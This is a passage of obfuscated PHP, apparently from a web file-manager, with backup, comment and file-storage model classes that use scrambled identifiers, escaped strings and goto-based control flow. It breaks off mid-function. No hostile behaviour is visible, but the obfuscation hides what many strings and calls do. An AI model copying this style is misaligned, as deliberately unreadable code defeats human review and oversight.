(isset($EßÁ≤∂Öìœ[$c’˜úá¢é‰[186]])) { $BÇßƒ‚õ§ê[$c’˜úá¢é‰[186]][$c’˜úá¢é‰[1399]] = $EßÁ≤∂Öìœ[$c’˜úá¢é‰[186]]; unset($EßÁ≤∂Öìœ[$c’˜úá¢é‰[186]]); } return array_merge($BÇßƒ‚õ§ê, $EßÁ≤∂Öìœ); goto AúæÌ÷ØÈ»; c†—¨†ìŒÒ: Action($c’˜úá¢é‰[2109])->taskInit(); $a¯Ìﬂ∫Ê¨à = Model($c’˜úá¢é‰[2110])->listData(); foreach ($a¯Ìﬂ∫Ê¨à as $d†èé”éÕ∂) { if ($d†èé”éÕ∂[$c’˜úá¢é‰[1082]] == $c’˜úá¢é‰[83] && $d†èé”éÕ∂[$c’˜úá¢é‰[1412]] == $c’˜úá¢é‰[2111]) { $BÇßƒ‚õ§ê = $d†èé”éÕ∂; break; } } goto f°ºØΩà‘ö; e‰†Ïº‹®ø: $c’˜úá¢é‰ =& $_SERVER[¯èãÄπµ]; $EßÁ≤∂Öìœ = Model($c’˜úá¢é‰[1090])->get($c’˜úá¢é‰[715]); $EßÁ≤∂Öìœ = json_decode($EßÁ≤∂Öìœ, !0); goto f¡òé”É”Ö; f¡òé”É”Ö: $EßÁ≤∂Öìœ = is_array($EßÁ≤∂Öìœ) ? $EßÁ≤∂Öìœ : array(); if (!isset($EßÁ≤∂Öìœ[$c’˜úá¢é‰[695]])) { $EßÁ≤∂Öìœ[$c’˜úá¢é‰[695]] = $c’˜úá¢é‰[464]; } $BÇßƒ‚õ§ê = array(); goto c†—¨†ìŒÒ; AúæÌ÷ØÈ»: } public function listData($E¬Üˆ…áö¢ = false, $EºÍíìÑæß = "\x6d\x6f\x64\151\x66\171\124\151\x6d\x65", $fæ◊»≠›™ç = false) { return parent::listData($E¬Üˆ…áö¢, $EºÍíìÑæß, !0); } public function lastItem() { $a©¶ﬁç¶ãº = $this->listData(); return !empty($a©¶ﬁç¶ãº[0]) ? $a©¶ﬁç¶ãº[0] : null; } public function kill($BËãçô‡„) { goto añ€ÆÀƒ—ﬁ; F«À≤ä∞ï™: $FÎÒ∞ﬂÕ§Ú = $cÈ√ÏÔæ[$aõ§ßâ‰çô[28]]; $fœï∑òÎœΩ = TEMP_FILES . $aõ§ßâ‰çô[713] . $FÎÒ∞ﬂÕ§Ú . $aõ§ßâ‰çô[8]; IO::remove($fœï∑òÎœΩ, !1); goto c´¶◊»ÚË÷; c´¶◊»ÚË÷: return $this->remove($BËãçô‡„); goto f‚ñ•‘ú”à; e≠‡«ÙÇÇ‘: Task::kill($aõ§ßâ‰çô[714]); Task::kill($aõ§ßâ‰çô[732]); Task::kill($aõ§ßâ‰çô[739]); goto F«À≤ä∞ï™; añ€ÆÀƒ—ﬁ: $aõ§ßâ‰çô =& $_SERVER[¯èãÄπµ]; $cÈ√ÏÔæ = $this->listData($BËãçô‡„); if (!$cÈ√ÏÔæ || empty($cÈ√ÏÔæ[$aõ§ßâ‰çô[28]])) { return !0; } goto e≠‡«ÙÇÇ‘; f‚ñ•‘ú”à: } public function remove($FÂáÔ´ê†) { $B‚ï‹ﬂ€ÚÈ = $this->listData($FÂáÔ´ê†); if (!$B‚ï‹ﬂ€ÚÈ) { return !0; } return $this->backupRemove($B‚ï‹ﬂ€ÚÈ); } private function backupRemove($dó°û¿ìÉú) { $Cîﬁ·‚ø¡è =& $_SERVER[¯èãÄπµ]; parent::remove($dó°û¿ìÉú[$Cîﬁ·‚ø¡è[363]]); $dÒÑ¡√çΩ¿ = "\x7b\x69\x6f\72{$dó°û¿ìÉú[$Cîﬁ·‚ø¡è[694]]}\x7d\x2f\144\x61\x74\x61\142\x61\x73\145\57\142\x61\143\153\x75\x70\137" . $dó°û¿ìÉú[$Cîﬁ·‚ø¡è[28]]; IO::remove($dÒÑ¡√çΩ¿, !1); return !0; } public function start() { goto cÛüŸêÍ◊∫; a–”Û∞Êá: if (!$BáÑÛè‡¶ß || $BáÑÛè‡¶ß[$AÌÉŒ“¥Àˆ[1396]] != $AÌÉŒ“¥Àˆ[83]) { return !1; } $EÖ’∞¥âÊÒ = $this->process(); foreach ($EÖ’∞¥âÊÒ as $C©‘˘”Ï¡) { if ($C©‘˘”Ï¡) { return Task::restart($C©‘˘”Ï¡[$AÌÉŒ“¥Àˆ[363]]); } } goto b∏µóêêåÖ; cÛüŸêÍ◊∫: $AÌÉŒ“¥Àˆ =& $_SERVER[¯èãÄπµ]; if ($GLOBALS[$AÌÉŒ“¥Àˆ[6]][$AÌÉŒ“¥Àˆ[84]][$AÌÉŒ“¥Àˆ[2112]] != $AÌÉŒ“¥Àˆ[83]) { return !0; } $BáÑÛè‡¶ß = $this->config(); goto a–”Û∞Êá; c–»˘Ñ¶Ω∂: return !0; goto c’ØÍÀ•”ß; b∏µóêêåÖ: $dÇÊ›‹ùø¢ = new Backup(); $dÇÊ›‹ùø¢->keep(); if (!$dÇÊ›‹ùø¢->db()) { return !1; } goto CöùÇõ™≤™; CöùÇõ™≤™: if (!$dÇÊ›‹ùø¢->dbFile()) { return !1; } if ($BáÑÛè‡¶ß[$AÌÉŒ“¥Àˆ[695]] == $AÌÉŒ“¥Àˆ[464]) { $dÇÊ›‹ùø¢->file(); } Backup::set(array($AÌÉŒ“¥Àˆ[692] => 1, $AÌÉŒ“¥Àˆ[706] => time())); goto c–»˘Ñ¶Ω∂; c’ØÍÀ•”ß: } public function process() { $D‘Ω†›ÖÏª =& $_SERVER[¯èãÄπµ]; return array($D‘Ω†›ÖÏª[697] => Task::get($D‘Ω†›ÖÏª[714]), $D‘Ω†›ÖÏª[700] => Task::get($D‘Ω†›ÖÏª[732]), $D‘Ω†›ÖÏª[163] => Task::get($D‘Ω†›ÖÏª[739])); } public function restore() { $dö®àà◊Ìè =& $_SERVER[¯èãÄπµ]; ActionCall($dö®àà◊Ìè[2113], !0, 1); ActionCall($dö®àà◊Ìè[2113], !0, 0); } } goto CÒ¯∑§µΩ; CÒ¯∑§µΩ: class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\145\156\x74"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\141\x6d\145" => "\x63\x6f\155\155\x65\x6e\x74\x5f\x6d\x65\164\x61", "\x6d\145\164\x61\x46\x69\x65\154\x64" => "\x63\x6f\155\x6d\145\156\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($cêˆÔ™Æ≥∏) { $b≤êÖ≠Ùëâ =& $_SERVER[¯èãÄπµ]; if ($cêˆÔ™Æ≥∏[$b≤êÖ≠Ùëâ[2114]]) { $a≈¨Õø∫ìñ = $this->where(array($b≤êÖ≠Ùëâ[2115] => $cêˆÔ™Æ≥∏[$b≤êÖ≠Ùëâ[2114]]))->find(); if (!$a≈¨Õø∫ìñ || $a≈¨Õø∫ìñ[$b≤êÖ≠Ùëâ[367]] != $cêˆÔ™Æ≥∏[$b≤êÖ≠Ùëâ[367]] || $a≈¨Õø∫ìñ[$b≤êÖ≠Ùëâ[452]] != $cêˆÔ™Æ≥∏[$b≤êÖ≠Ùëâ[452]]) { return !1; } $this->where(array($b≤êÖ≠Ùëâ[2115] => $cêˆÔ™Æ≥∏[$b≤êÖ≠Ùëâ[2114]]))->setAdd($b≤êÖ≠Ùëâ[2116], 1); } return $this->add($cêˆÔ™Æ≥∏); } public function remove($F®¯ãæ•‚ì) { $C∆Ô“™†∫Ã =& $_SERVER[¯èãÄπµ]; $a˜…«°÷∞ö = array($C∆Ô“™†∫Ã[2115] => $F®¯ãæ•‚ì); $AëÊÏˆçÑé = $this->where($a˜…«°÷∞ö)->find(); if ($AëÊÏˆçÑé[$C∆Ô“™†∫Ã[2114]]) { $this->where(array($C∆Ô“™†∫Ã[2115] => $AëÊÏˆçÑé[$C∆Ô“™†∫Ã[2114]]))->setAdd($C∆Ô“™†∫Ã[2116], -1); } return $this->where($a˜…«°÷∞ö)->delete(); } public function edit($eÒØﬂãÜò∞, $EûÓ…Ωœ‡Â) { $f«À¿íïñ∏ =& $_SERVER[¯èãÄπµ]; $Eçå¶îó≥ö = array($f«À¿íïñ∏[2115] => $eÒØﬂãÜò∞); return $this->where($Eçå¶îó≥ö)->save(array($f«À¿íïñ∏[2117] => $EûÓ…Ωœ‡Â)); } public function prasise($A¨∞˘¥ÏÖˆ) { $FŒíòπ¨èÑ =& $_SERVER[¯èãÄπµ]; $eõ‡€ıÁ˜∫ = Model($FŒíòπ¨èÑ[2118]); $E¬Ù§√ˆ‹∂ = array($FŒíòπ¨èÑ[2115] => $A¨∞˘¥ÏÖˆ, $FŒíòπ¨èÑ[1415] => USER_ID); $b∑ ∫Õ≠ÔÆ = $eõ‡€ıÁ˜∫->where($E¬Ù§√ˆ‹∂)->find(); if (!$b∑ ∫Õ≠ÔÆ) { $eõ‡€ıÁ˜∫->add($E¬Ù§√ˆ‹∂); $cﬁò¢ë∫íé = $this->where(array($FŒíòπ¨èÑ[2115] => $A¨∞˘¥ÏÖˆ))->setAdd($FŒíòπ¨èÑ[2119], 1); } else { $eõ‡€ıÁ˜∫->where($E¬Ù§√ˆ‹∂)->delete(); $cﬁò¢ë∫íé = $this->where(array($FŒíòπ¨èÑ[2115] => $A¨∞˘¥ÏÖˆ))->setAdd($FŒíòπ¨èÑ[2119], -1); } return $cﬁò¢ë∫íé; } public function targetInfo($aÇ†êâ§ÍÉ, $FúÂÉ¢¿ƒÏ) { goto då´é¡ß Ü; CÀ›Î™¥ëã: return $fâﬂßË¬Öı; goto b∫ç◊◊Ø‚Ë; då´é¡ß Ü: $fÖê·®ãÊÁ =& $_SERVER[¯èãÄπµ]; $eÔÒΩ«ˆ€Ó = array($fÖê·®ãÊÁ[517] => $aÇ†êâ§ÍÉ, $fÖê·®ãÊÁ[518] => $FúÂÉ¢¿ƒÏ); $aÚãÇ“Ûﬂ = $this->where($eÔÒΩ«ˆ€Ó)->count(); goto d“ä»”í°ó; d“ä»”í°ó: $D‡õ‡’†óï = "\x52\111\x47\110\124\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x63\157\155\x6d\x65\x6e\164\x5f\x70\162\141\151\163\145\40\163\164\x61\162\x20\x6f\x6e\x20\143\x6f\x6d\x6d\x65\x6e\164\56\x63\157\155\155\145\x6e\164\x49\104\40\x3d\x20\x73\x74\x61\x72\x2e\143\157\x6d\x6d\145\156\x74\111\104"; $DÒ≤⁄ÉºÊ† = $this->alias($fÖê·®ãÊÁ[337])->where($eÔÒΩ«ˆ€Ó)->join($D‡õ‡’†óï, $fÖê·®ãÊÁ[2120])->count(); $fâﬂßË¬Öı = array($fÖê·®ãÊÁ[2121] => $aÚãÇ“Ûﬂ, $fÖê·®ãÊÁ[2122] => $DÒ≤⁄ÉºÊ†); goto CÀ›Î™¥ëã; b∫ç◊◊Ø‚Ë: } public function listData($D’üÂ∫âú§) { $e∑µãò®†Œ =& $_SERVER[¯èãÄπµ]; if (isset($D’üÂ∫âú§[$e∑µãò®†Œ[2123]])) { if ($D’üÂ∫âú§[$e∑µãò®†Œ[2123]]) { $D’üÂ∫âú§[$e∑µãò®†Œ[2124]] = array($e∑µãò®†Œ[932], intval($D’üÂ∫âú§[$e∑µãò®†Œ[2123]])); } unset($D’üÂ∫âú§[$e∑µãò®†Œ[2123]]); } if (isset($D’üÂ∫âú§[$e∑µãò®†Œ[2125]])) { if ($D’üÂ∫âú§[$e∑µãò®†Œ[2125]]) { $D’üÂ∫âú§[$e∑µãò®†Œ[2124]] = array($e∑µãò®†Œ[929], intval($D’üÂ∫âú§[$e∑µãò®†Œ[2125]])); } unset($D’üÂ∫âú§[$e∑µãò®†Œ[2125]]); } return $this->_listData($D’üÂ∫âú§); } private function _listData($fò‰•éÌº´) { $AÌå¨±µ‰≤ =& $_SERVER[¯èãÄπµ]; $F°ÁÚ£Ëó = $this->where($fò‰•éÌº´)->_makeOrder()->selectPage(100); $this->_listAppendParent($F°ÁÚ£Ëó[$AÌå¨±µ‰≤[350]]); $this->_listAppendUser($F°ÁÚ£Ëó[$AÌå¨±µ‰≤[350]]); $this->_listAppendMeta($F°ÁÚ£Ëó[$AÌå¨±µ‰≤[350]]); return $F°ÁÚ£Ëó; } private function _makeOrder() { $bÙ⁄‚ò›ˆ“ =& $_SERVER[¯èãÄπµ]; $FóﬁÏ∞Ì…Ú = array($bÙ⁄‚ò›ˆ“[2119], $bÙ⁄‚ò›ˆ“[2116], $bÙ⁄‚ò›ˆ“[183]); $C ¥ä•ﬁ≠ = Input::get($bÙ⁄‚ò›ˆ“[403], $bÙ⁄‚ò›ˆ“[7], $bÙ⁄‚ò›ˆ“[385], $FóﬁÏ∞Ì…Ú); $BáÙáœÔè∫ = Input::get($bÙ⁄‚ò›ˆ“[404], $bÙ⁄‚ò›ˆ“[7], $bÙ⁄‚ò›ˆ“[1417], array($bÙ⁄‚ò›ˆ“[2126], $bÙ⁄‚ò›ˆ“[401])); $E¥’Ó¥∂®Á = $C ¥ä•ﬁ≠ . $bÙ⁄‚ò›ˆ“[50] . $BáÙáœÔè∫; return $this->order($E¥’Ó¥∂®Á); } private function _listAppendParent(&$A¶åÊÌ ü€) { goto aöˆÀÚäî ; bÍ≠˜Ωòæñ: if (!$c›»†…≠“) { return; } $aÀπåƒ†Éˆ = $this->where(array($AÌäé›ôÕñ[2115] => array($AÌäé›ôÕñ[7], $c›»†…≠“)))->select(); $aÀπåƒ†Éˆ = array_to_keyvalue($aÀπåƒ†Éˆ, $AÌäé›ôÕñ[2124]); goto a©ÚÀîÁÆÚ; aöˆÀÚäî : $AÌäé›ôÕñ =& $_SERVER[¯èãÄπµ]; $c›»†…≠“ = array_unique(array_to_keyvalue($A¶åÊÌ ü€, $AÌäé›ôÕñ[33], $AÌäé›ôÕñ[2114])); $c›»†…≠“ = array_remove_value($c›»†…≠“, $AÌäé›ôÕñ[464]); goto bÍ≠˜Ωòæñ; a©ÚÀîÁÆÚ: foreach ($A¶åÊÌ ü€ as &$b∏ˆ…ñ–èâ) { if (isset($aÀπåƒ†Éˆ[$b∏ˆ…ñ–èâ[$AÌäé›ôÕñ[2114]]])) { $b∏ˆ…ñ–èâ[$AÌäé›ôÕñ[2127]] = $aÀπåƒ†Éˆ[$b∏ˆ…ñ–èâ[$AÌäé›ôÕñ[2114]]]; } } goto eÇìÉŒõÏÿ; eÇìÉŒõÏÿ: } private function _listAppendUser(&$cﬂé‡Ù“…¿) { goto E„Ëﬂ ÇÇ‡; E„Ëﬂ ÇÇ‡: $D Æ∫™“ﬁÖ =& $_SERVER[¯èãÄπµ]; $B∞ˆÇÙü€ﬂ = array_unique(array_to_keyvalue($cﬂé‡Ù“…¿, $D Æ∫™“ﬁÖ[33], $D Æ∫™“ﬁÖ[1424])); $B∞ˆÇÙü€ﬂ = array_remove_value($B∞ˆÇÙü€ﬂ, $D Æ∫™“ﬁÖ[464]); goto AÇáÜñãøÚ; dàçÖå≥ŸÀ: foreach ($cﬂé‡Ù“…¿ as &$fÑ–†„Ë‚¢) { $fÑ–†„Ë‚¢[$D Æ∫™“ﬁÖ[531]] = $F—öäú¥‚…[$fÑ–†„Ë‚¢[$D Æ∫™“ﬁÖ[1424]]]; if (isset($fÑ–†„Ë‚¢[$D Æ∫™“ﬁÖ[2127]])) { $fÑ–†„Ë‚¢[$D Æ∫™“ﬁÖ[2127]][$D Æ∫™“ﬁÖ[531]] = $F—öäú¥‚…[$fÑ–†„Ë‚¢[$D Æ∫™“ﬁÖ[2127]][$D Æ∫™“ﬁÖ[1424]]]; } } goto FûÃËÛ∏ãÏ; AÇáÜñãøÚ: if (count($B∞ˆÇÙü€ﬂ) == 0) { return; } foreach ($cﬂé‡Ù“…¿ as $fÑ–†„Ë‚¢) { if (isset($fÑ–†„Ë‚¢[$D Æ∫™“ﬁÖ[2127]])) { $B∞ˆÇÙü€ﬂ[] = $fÑ–†„Ë‚¢[$D Æ∫™“ﬁÖ[2127]][$D Æ∫™“ﬁÖ[1424]]; } } $F—öäú¥‚… = Model($D Æ∫™“ﬁÖ[473])->userListInfo($B∞ˆÇÙü€ﬂ); goto dàçÖå≥ŸÀ; FûÃËÛ∏ãÏ: } private function _listAppendMeta(&$a«ÑÕ’ä≥º) { goto aÔì‚£üÉó; bóÏ””∫ß‚: if (!$CãØ√èÉ„¥) { return; } foreach ($a«ÑÕ’ä≥º as $F≤ÌòèÛõë) { if (isset($F≤ÌòèÛõë[$c”æ°ßÁî†[2127]])) { $CãØ√èÉ„¥[] = $F≤ÌòèÛõë[$c”æ°ßÁî†[2127]][$c”æ°ßÁî†[2124]]; } } $aõ⁄ê∆ÀñŸ = $this->metaList($CãØ√èÉ„¥); goto Aû¿«äâ‹Ü; Aû¿«äâ‹Ü: if (!$aõ⁄ê∆ÀñŸ) { return !1; } foreach ($a«ÑÕ’ä≥º as &$F≤ÌòèÛõë) { $F≤ÌòèÛõë[$c”æ°ßÁî†[413]] = $aõ⁄ê∆ÀñŸ[$F≤ÌòèÛõë[$c”æ°ßÁî†[2124]]]; if (isset($F≤ÌòèÛõë[$c”æ°ßÁî†[2127]])) { $F≤ÌòèÛõë[$c”æ°ßÁî†[2127]][$c”æ°ßÁî†[413]] = $aõ⁄ê∆ÀñŸ[$F≤ÌòèÛõë[$c”æ°ßÁî†[2127]][$c”æ°ßÁî†[2124]]]; } } goto böáö∏Ñû˜; aÔì‚£üÉó: $c”æ°ßÁî† =& $_SERVER[¯èãÄπµ]; $CãØ√èÉ„¥ = array_unique(array_to_keyvalue($a«ÑÕ’ä≥º, $c”æ°ßÁî†[33], $c”æ°ßÁî†[2124])); $CãØ√èÉ„¥ = array_remove_value($CãØ√èÉ„¥, $c”æ°ßÁî†[464]); goto bóÏ””∫ß‚; böáö∏Ñû˜: } private function metaList($dá≤Éß∑”¢) { goto Dø…¡≠Ù≥¿; C”éŸÊñÒü: $a†…À∞éÔÒ = Model($C™‘◊Ÿˆ÷ﬂ[2128])->where($E±…ﬁπ¶Ù—)->select(); $a†…À∞éÔÒ = array_to_keyvalue_group($a†…À∞éÔÒ, $C™‘◊Ÿˆ÷ﬂ[2124]); foreach ($a†…À∞éÔÒ as $f≤Öﬁ› ø± => $EÓı·¯ Òã) { $Cåê§ŒÛÚ© = array(); foreach ($EÓı·¯ Òã as $dê‰¬Ñ·®) { $Cåê§ŒÛÚ©[$dê‰¬Ñ·®[$C™‘◊Ÿˆ÷ﬂ[89]]] = $dê‰¬Ñ·®[$C™‘◊Ÿˆ÷ﬂ[355]]; } $a†…À∞éÔÒ[$f≤Öﬁ› ø±] = $Cåê§ŒÛÚ©; } goto B—≈ÇàèÖä; Dø…¡≠Ù≥¿: $C™‘◊Ÿˆ÷ﬂ =& $_SERVER[¯èãÄπµ]; if (!$dá≤Éß∑”¢) { return array(); } $E±…ﬁπ¶Ù— = array($C™‘◊Ÿˆ÷ﬂ[2124] => array($C™‘◊Ÿˆ÷ﬂ[7], $dá≤Éß∑”¢)); goto C”éŸÊñÒü; B—≈ÇàèÖä: return $a†…À∞éÔÒ ? $a†…À∞éÔÒ : array(); goto b´«Üµ®âç; b´«Üµ®âç: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\154\145"; protected $tableMeta = array("\x74\141\142\154\145\116\141\155\x65" => "\x69\157\x5f\x66\151\154\145\137\x6d\145\164\x61", "\x6d\x65\164\141\x46\151\x65\154\144" => "\146\x69\x6c\x65\111\x44"); public function fileInfo($b°´à∫–Ωˆ) { $c“íŒ»±æ° =& $_SERVER[¯èãÄπµ]; static $a ªàèÖß˘ = array(); if (!isset($a ªàèÖß˘[$b°´à∫–Ωˆ])) { $Aî£Á©‹Íë = $c“íŒ»±æ°[2129]; $eÌüŒùçê¯ = Model($c“íŒ»±æ°[418])->field($Aî£Á©‹Íë)->where(array($c“íŒ»±æ°[416] => $b°´à∫–Ωˆ))->find(); $a ªàèÖß˘[$b°´à∫–Ωˆ] = $eÌüŒùçê¯; } return $a ªàèÖß˘[$b°´à∫–Ωˆ]; } public function addFileByContent($b¡‹”∑à®ó = '', $aøÇ§§Ê¶æ = '') { goto d◊áÍÏ÷ˆã; d◊áÍÏ÷ˆã: $F°áõÚ⁄£ÿ =& $_SERVER[¯èãÄπµ]; $EÊ¯°ãÃã€ = TEMP_PATH . $F°áõÚ⁄£ÿ[2130]; if (!is_dir($EÊ¯°ãÃã€)) { mk_dir($EÊ¯°ãÃã€); } goto a‹ﬂï⁄ãø«; aÛµ“‹ôı‘: if (file_exists($d∆∏´·Ñ¡ê)) { @unlink($d∆∏´·Ñ¡ê); } return $dÔ‡Ç”“å≈; goto B˜ﬂÑóÙ⁄∑; a‹ﬂï⁄ãø«: $d∆∏´·Ñ¡ê = $EÊ¯°ãÃã€ . $F°áõÚ⁄£ÿ[2131] . rand_string(16); file_put_contents($d∆∏´·Ñ¡ê, $b¡‹”∑à®ó); $dÔ‡Ç”“å≈ = $this->addFile($d∆∏´·Ñ¡ê, $aøÇ§§Ê¶æ, !0); goto aÛµ“‹ôı‘; B˜ﬂÑóÙ⁄∑: } public function createFileName($eõéπ«ìå∂) { goto Dœ©∏Õí¨·; e•Á◊◊¬öÛ: $Eáƒ†ÇèÌ† = $BÔ§Ôö«ö‚->pathFather($d‚Àÿ—¥û´); static $Aç‰Ê¢ÚıÀ = false; $f≈ìÖãì˘‚ = $FÇ≤üú˘êë[2132] . md5($Eáƒ†ÇèÌ†); goto Dôßôœ±∑À; Dœ©∏Õí¨·: $FÇ≤üú˘êë =& $_SERVER[¯èãÄπµ]; $BÔ§Ôö«ö‚ = IO::init($FÇ≤üú˘êë[8]); $d‚Àÿ—¥û´ = $this->makeFilePath($eõéπ«ìå∂, $BÔ§Ôö«ö‚); goto e•Á◊◊¬öÛ; Dôßôœ±∑À: if (!$Aç‰Ê¢ÚıÀ && !Cache::get($f≈ìÖãì˘‚)) { $Aç‰Ê¢ÚıÀ = !0; $cÖêçÜ±÷ç = IO::mkdir($Eáƒ†ÇèÌ†); if (!IO::exist($cÖêçÜ±÷ç . $FÇ≤üú˘êë[2133])) { IO::mkfile($cÖêçÜ±÷ç . $FÇ≤üú˘êë[2133]); } Cache::set($f≈ìÖãì˘‚, 1, 3600 * 2); } return $d‚Àÿ—¥û´; goto Aƒ∏ô≥•∏¶; Aƒ∏ô≥•∏¶: } public function makeFilePath($aÛıÙøë‡´, $CﬁÇÃƒï“ã) { goto AÑÖ£ìî«Œ; AÑÖ£ìî«Œ: $C …«∂¯‰å =& $_SERVER[¯èãÄπµ]; $dúﬂ∏Áß¶£ = Model($C …«∂¯‰å[1090])->get($C …«∂¯‰å[2134]); $c∑œàœ†Ë  = KodIO::defaultIO() . date($C …«∂¯‰å[2135]); goto DÙïÊåà—ª; aèôŒóå©Ì: switch ($dúﬂ∏Áß¶£) { case $C …«∂¯‰å[2137]: $e≤§÷√Ö⁄¡ = $e≤§÷√Ö⁄¡ . $C …«∂¯‰å[91] . $CﬁÇÃƒï“ã->ext($aÛıÙøë‡´); if ($CﬁÇÃƒï“ã->ext($aÛıÙøë‡´) == $C …«∂¯‰å[2077]) { $e≤§÷√Ö⁄¡ .= $C …«∂¯‰å[2138]; } break; case $C …«∂¯‰å[2139]: goto fÿÇ°ıœîì; cÖÈáúä¬É: break; goto A˜ﬂ∆®√§Ó; fÿÇ°ıœîì: $Cœ⁄⁄ºòœ¥ = Model($C …«∂¯‰å[1090])->get($C …«∂¯‰å[1325]); $Eóø‹¡ÿÇ≥ = substr(md5($C …«∂¯‰å[1897] . $Cœ⁄⁄ºòœ¥ . date($C …«∂¯‰å[690])), 0, 8); $c∑œàœ†Ë  = KodIO::defaultIO() . date($C …«∂¯‰å[2140]) . $Eóø‹¡ÿÇ≥ . $C …«∂¯‰å[8]; goto Cì˘»´Õ™à; Cì˘»´Õ™à: if ($CﬁÇÃƒï“ã->ext($aÛıÙøë‡´) == $C …«∂¯‰å[2077]) { $aÛıÙøë‡´ .= $C …«∂¯‰å[2138]; } $bÔﬂêè°•Ò = IO::fileNameAuto($c∑œàœ†Ë , $aÛıÙøë‡´); $e≤§÷√Ö⁄¡ = $c∑œàœ†Ë  . $bÔﬂêè°•Ò; goto cÖÈáúä¬É; A˜ﬂ∆®√§Ó: case $C …«∂¯‰å[2136]: break; default: break; } return $e≤§÷√Ö⁄¡; goto AåáÎäÊ‹à; DÙïÊåà—ª: $e≤§÷√Ö⁄¡ = $c∑œàœ†Ë  . rand_string(5) . short_id(100); $aÛıÙøë‡´ = str_replace($C …«∂¯‰å[8], $C …«∂¯‰å[70], KodIO::clear($aÛıÙøë‡´)); if (!$aÛıÙøë‡´) { $dúﬂ∏Áß¶£ = $C …«∂¯‰å[2136]; } goto aèôŒóå©Ì; AåáÎäÊ‹à: } public function addFileByRemote($dõ®ª˘à¥∏, $cíéáõ…Ωû, $fﬁ˘ˆÜ∂Õç = array()) { goto D≤ºÍ°È◊¥; Fª”òåàà≥: if ($f∆å«ﬂõü≠ = $this->addFileCheckExist($d†é¶Á∞ÈÈ[$bçÀöåàä[160]], $d†é¶Á∞ÈÈ[$bçÀöåàä[159]], $d†é¶Á∞ÈÈ[$bçÀöåàä[77]])) { return $f∆å«ﬂõü≠; } return $this->addFileData($d†é¶Á∞ÈÈ); goto A™ï≈ÏÔËÏ; EÃœ›èÖåÆ: $fâ≥”˜º√£ = IO::hashMd5($dõ®ª˘à¥∏, $F◊°Õß––÷); $F¨À∆ﬂË∏“ = KodIO::defaultDriver(); $d†é¶Á∞ÈÈ = array($bçÀöåàä[516] => IO::size($dõ®ª˘à¥∏), $bçÀöåàä[2141] => 1, $bçÀöåàä[382] => $cíéáõ…Ωû, $bçÀöåàä[738] => $F¨À∆ﬂË∏“[$bçÀöåàä[363]], $bçÀöåàä[383] => $dõ®ª˘à¥∏, $bçÀöåàä[2142] => $fﬁ˘ˆÜ∂Õç[$bçÀöåàä[160]] ? $fﬁ˘ˆÜ∂Õç[$bçÀöåàä[160]] : IO::hashSimple($dõ®ª˘à¥∏), $bçÀöåàä[2143] => $fâ≥”˜º√£ ? $fâ≥”˜º√£ : $F◊°Õß––÷); goto Fª”òåàà≥; D≤ºÍ°È◊¥: $bçÀöåàä =& $_SERVER[¯èãÄπµ]; if (!IO::exist($dõ®ª˘à¥∏)) { return !1; } $F◊°Õß––÷ = $fﬁ˘ˆÜ∂Õç[$bçÀöåàä[159]] ? $fﬁ˘ˆÜ∂Õç[$bçÀöåàä[159]] : $bçÀöåàä[33]; goto EÃœ›èÖåÆ; A™ï≈ÏÔËÏ: } private function addFileData($Eˆì± ’Âé) { $b·∞ªÑÏ‹† =& $_SERVER[¯èãÄπµ]; if (!$Eˆì± ’Âé) { return !1; } $Eˆì± ’Âé[$b·∞ªÑÏ‹†[77]] = intval($Eˆì± ’Âé[$b·∞ªÑÏ‹†[77]]); if (!$Eˆì± ’Âé[$b·∞ªÑÏ‹†[77]] && strlen($Eˆì± ’Âé[$b·∞ªÑÏ‹†[160]]) > 32) { $Eˆì± ’Âé[$b·∞ªÑÏ‹†[77]] = intval(substr($Eˆì± ’Âé[$b·∞ªÑÏ‹†[160]], 32)); } $a‹ª¡‘ÜÚ∫ = $this->add($Eˆì± ’Âé); return $this->find($a‹ª¡‘ÜÚ∫); } public function addFile($Cáÿ„ óòè, $BÀ÷åãÙèÍ, $Eÿ¡Ÿ¡ñ ∫ = false) { $dêÔ–”¿çª = IO::hashSimple($Cáÿ„ óòè); $DñÛ∫©Ü§à = IO::hashMd5($Cáÿ„ óòè); $D÷ÈëÁ«ŸË = IO::size($Cáÿ„ óòè); if ($D÷¥€·â¬ñ = $this->addFileCheckExist($dêÔ–”¿çª, $DñÛ∫©Ü§à, $D÷ÈëÁ«ŸË)) { return $D÷¥€·â¬ñ; } $fÁ©‘âÖı› = $this->addFileMake($Cáÿ„ óòè, $D÷ÈëÁ«ŸË, $dêÔ–”¿çª, $DñÛ∫©Ü§à, $BÀ÷åãÙèÍ, $Eÿ¡Ÿ¡ñ ∫); return $this->addFileData($fÁ©‘âÖı›); } public function addFileMake($bÂ—ÍÔµå›, $c¶±»™îÇÖ, $cÏ£ºñ∞åü, $eïﬁ∆òôòá, $A ¶’Ú¶ÎÕ, $FÊãâπı†ä) { goto f–´ïØ’≥; a⁄¡õäõÆã: $BéÍÕèÆ…ø = KodIO::defaultDriver(); $cÂ‚ßÉ‹Í÷ = array($bíıﬂÑ“¥›[516] => $c¶±»™îÇÖ, $bíıﬂÑ“¥›[2141] => 1, $bíıﬂÑ“¥›[382] => $A ¶’Ú¶ÎÕ, $bíıﬂÑ“¥›[738] => $BéÍÕèÆ…ø[$bíıﬂÑ“¥›[363]], $bíıﬂÑ“¥›[383] => $F¥ÜèàÁÓ”, $bíıﬂÑ“¥›[2142] => $cÏ£ºñ∞åü, $bíıﬂÑ“¥›[2143] => $eïﬁ∆òôòá); return $cÂ‚ßÉ‹Í÷; goto d—ƒ∑¨îë÷; fâ¶¶∂µåÉ: $Däﬁî·µïã = get_path_this($F¥ÜèàÁÓ”); if ($FÊãâπı†ä) { $cùÒΩá”® = IO::move($bÂ—ÍÔµå›, $D⁄Ÿ™ﬂÓ≈Â, !1, $Däﬁî·µïã); } else { $cùÒΩá”® = IO::copy($bÂ—ÍÔµå›, $D⁄Ÿ™ﬂÓ≈Â, !1, $Däﬁî·µïã); } if (!$cùÒΩá”®) { return !1; } goto a⁄¡õäõÆã; f–´ïØ’≥: $bíıﬂÑ“¥› =& $_SERVER[¯èãÄπµ]; 